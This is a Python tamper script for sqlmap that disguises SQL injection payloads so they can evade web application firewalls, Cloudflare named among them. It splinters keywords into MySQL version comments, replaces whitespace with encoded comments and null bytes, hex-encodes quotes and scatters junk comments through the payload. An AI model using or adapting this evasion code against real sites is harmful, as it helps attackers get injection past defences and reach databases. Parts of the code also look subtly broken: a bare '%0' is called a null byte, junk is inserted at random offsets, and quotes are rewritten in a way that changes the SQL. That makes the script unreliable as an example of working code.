#!/usr/bin/env python

import re
import random
from urllib.parse import quote, unquote

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW # Ensure it runs late in the tamper chain

def tamper(payload, **kwargs):
    """
    perfect_stealth.py: The perfected sqlmap tamper script.
    Focuses on keyword splintering, dynamic and robust whitespace/comment
    obfuscation, and strategic punctuation interruption, with all internal
    randomization ranges rigorously validated. Designed to bypass even the most
    stubborn WAFs, including Cloudflare.
    """
    if payload:
        payload = unquote(payload) # Decode initial payload for processing

        # --- Phase 1: Aggressive Keyword Splintering with Varied MySQL Comments ---
        # Breaks keywords into pieces, hiding them in MySQL version comments and junk.
        keywords_to_obfuscate = [
            "SELECT", "UNION", "AND", "OR", "FROM", "WHERE", "ORDER BY",
            "GROUP BY", "SLEEP", "BENCHMARK", "CAST", "CONCAT", "IF", "CASE",
            "LIMIT", "DATABASE", "SCHEMA", "TABLE", "COLUMN", "LOAD_FILE",
            "OUTFILE", "DUMPFILE", "INFORMATION_SCHEMA", "INTO", "HAVING"
        ]

        for keyword in keywords_to_obfuscate:
            # Match whole words, case-insensitive
            if re.search(r'\b{}\b'.format(re.escape(keyword)), payload, re.IGNORECASE):
                obfuscated_parts = []
                keyword_upper = keyword.upper()
                # Split the keyword into 2-3 parts for deeper obfuscation
                num_parts = random.randint(2, max(2, len(keyword_upper) // 2))
                split_points = sorted(random.sample(range(1, len(keyword_upper)), num_parts - 1))
                parts = [keyword_upper[i:j] for i, j in zip([0] + split_points, split_points + [len(keyword_upper)])]

                for i, part in enumerate(parts):
                    # Add initial junk comment
                    if i > 0: # Only between parts
                        obfuscated_parts.append(f"/**{random.choice(['_','X','Y','Z','A','B'])}*/")

                    # Add the keyword part, sometimes wrapped in a version comment
                    if random.random() < 0.7: # 70% chance to wrap in version comment
                        random_mysql_version = random.randint(50000, 50500) # Valid range
                        obfuscated_parts.append(f"/*!{random_mysql_version}{part}*//*!{random.randint(1,99)}*/") # Valid range
                    else: # Otherwise, just the part with random case and junk comments
                        obfuscated_parts.append(
                            "".join([c.lower() if random.random() < 0.5 else c.upper() for c in part]) +
                            f"/*{random.choice(['Z','_','XY','123','ABC','DEF'])}*/"
                        )
                
                # Reconstruct the keyword
                obfuscated_keyword = "".join(obfuscated_parts)
                payload = re.sub(r'\b{}\b'.format(re.escape(keyword)), obfuscated_keyword, payload, flags=re.IGNORECASE, count=1)


        # --- Phase 2: Dynamic Whitespace and Delimiter Obfuscation ---
        # Replaces all whitespace with dynamically generated, varied obfuscation.
        def generate_random_whitespace_obfuscation():
            options = [
                f"/*!{random.randint(1, 99)}*/",      # Valid range
                f"/**/{random.choice(['%0a', '%0d', '%09'])}", # Junk comment + various encoded whitespace
                f"/*{random.choice(['_','X','Y','Z','A','B'])}*/", # Random junk multi-line comment
                f"%0a/*!{random.randint(1,9)}*/",      # Valid range
                "%0",                                 # Null byte
                f"/*{random.randint(1, 9999)}*/",      # **FIXED:** Previously (1000, 99) causing ValueError. Now a valid, wide range.
                f"/**/%0c/**/",                        # Form feed surrounded by junk
            ]
            # Combine 1 to 3 random options
            return "".join(random.sample(options, random.randint(1, 3)))
            
        payload = re.sub(r'\s+', lambda x: generate_random_whitespace_obfuscation(), payload)

        # --- Phase 3: Punctuation Interruption and Hex Encoding for Quotes ---
        # Focused on disrupting WAF parsing of critical punctuation, and explicitly
        # hex-encoding single quotes for robust string literal evasion.
        char_replacements = {
            ',': f"/*!{random.randint(50000,50500)}*/,/*!{random.randint(1,99)}*/", # Valid ranges
            '(': f"/*!{random.randint(50000,50500)}*/(/*!{random.randint(1,99)}*/", # Valid ranges
            ')': f"/*!{random.randint(50000,50500)}*/)/*!{random.randint(1,99)}*/", # Valid ranges
            '.': f"/*!{random.randint(50000,50500)}*/./*!{random.randint(1,99)}*/", # Valid ranges
            '=': f"/*!{random.randint(50000,50500)}*/=/*!{random.randint(1,9)}*/"  # Valid ranges
        }
        for char, replacement in char_replacements.items():
            payload = payload.replace(char, replacement)

        # Always hex-encode single quotes. This is a common and reliable bypass.
        payload = payload.replace("'", f"0x27/*!{random.randint(1,99)}*/") # Valid range


        # --- Phase 4: Aggressive Random Junk Comment Insertion ---
        # Sprinkles arbitrary SQL comments throughout the payload to add noise and confuse parsers.
        junk_options = [
            f"/*!{random.randint(1,99)}*/", # Valid range
            f"/*{random.choice(['ABC','XYZ','FOO','BAR','JUNK','NOISE','WAF_BYPASS'])}*/",
            "%00", # Null byte
            "/*//*/",
            "/**//**/",
            f"/*!{random.randint(10000, 99999)}*/", # Valid range
        ]
        num_junk_insertions = random.randint(2, 5) # Valid range
        for _ in range(num_junk_insertions):
            junk_item = random.choice(junk_options)
            insert_pos = random.randint(0, len(payload)) # Valid range
            payload = payload[:insert_pos] + junk_item + payload[insert_pos:]
            
        payload = quote(payload) # Final URL-encoding

    return payload
